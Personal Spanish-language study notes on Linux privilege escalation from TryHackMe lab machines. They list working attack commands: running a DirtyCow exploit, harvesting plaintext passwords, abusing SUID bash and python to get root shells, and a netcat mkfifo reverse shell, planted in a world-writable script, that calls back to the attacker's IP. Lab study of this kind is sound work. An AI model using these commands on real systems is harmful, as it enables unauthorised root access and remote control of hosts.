[[Escala de privilegios LINUX]]
- Podemos ejecutar el script linux-exploit-suggester.sh para ver diferentes CVEs a los que posiblemente sea vulnerable el sistema. Uno de los posibles es dirtycow, como en la máquina de Linux PrivEsc Arena de THM.
	Para ejecutar el dirtycow habría que compilar y ejecutar el binario:
		**$ gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0 c0w**
		**$ ./c0w**

- Mirar si existe fichero .ovpn y si existe en él la directiva auth-user-pass, y ver que valor tiene. Debería ser la ruta a donde está la contraseña en texto plano.

- Mirar el fichero .bash_history para ver si se ha colado una contraseña.

- Comprobar los permisos de los ficheros, en especial del shadow y del passwd.

- Comprobar si se puede ver el fichero id_rsa para loguearse por ssh. Si lo está, ponerle permisos solo de lectura ($ chmod 400 id_rsa).

- Ejecutar "sudo -l" y ver que se puede ejecutar como root.

- El siguiente comando sirve para ver los binarios SUID del sistema:
	- **$ find / -type f -perm -04000 -ls 2>/dev/null**


- El siguiente comando sirve para ver si algún binario está suelto:
	- **$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"**

- El siguiente comando busca recursivamente en todo el sistema de archivos en busca de archivos binarios que tengan capacidades asignadas y muestra los permisos de capacidad de esos archivos. Cualquier mensaje de error se suprime y no se muestra en la terminal:
	- **$ getcap -r / 2>/dev/null**

- Este comando copia una bash en el directorio /tmp y luego le añade permisos SETUID:
	- **cp /bin/bash /tmp/bash; chmod +s /tmp/bash**
	Despu-es podemos ejecutar la bash con la flag -p, que nos da permisos de superusuario:
	- **$ /tmp/bash -p**


MÁQUINA RootMe de THM
Si vemos los archivos que tienen el bit SUID activo, vemos que python está activo. Eso es bastante sospechoso. Podemos ejecutar python como sudo y ejecutar una shell de la siguiente manera:

	-$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

De esta manera abrimos una shell con privilegios con python.

MÁQUINA LazyAdmin de THM
En esta máquina hemos podido observar que al ejecutar `$ sudo -l` nos salían que podíamos ejecutar con derechos de root lo siguiente:

- (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

El fichero **backup.pl** ejecutaba un fichero .sh (copy.sh) que ejecutaba una shell:

- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f`

El fichero copy.sh era ejecutable por todo el mundo, a causa de weak file permissions.
Por lo tanto hemos podido aprovecharnos de esto y ejecutar una shell en NUESTRA máquina con permisos de root:

Primero modificamos el fichero. En este caso no había ni vim ni vi ni nano, por lo tanto hemos recurrido a lo siguiente:

- `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc NUESTRA_IP_DE_THM 1337 >/tmp/f" > /etc/copy.sh`

NOTA: Anteriormente, como en todas las reverse shell, hemos puesto un puerto en escucha.

Por último, tenemos que ejecutar el fichero con permisos root.

- `$ sudo /usr/bin/perl /home/itguy/backup.pl`

Y ya tendríamos una shell con root. YEEHA!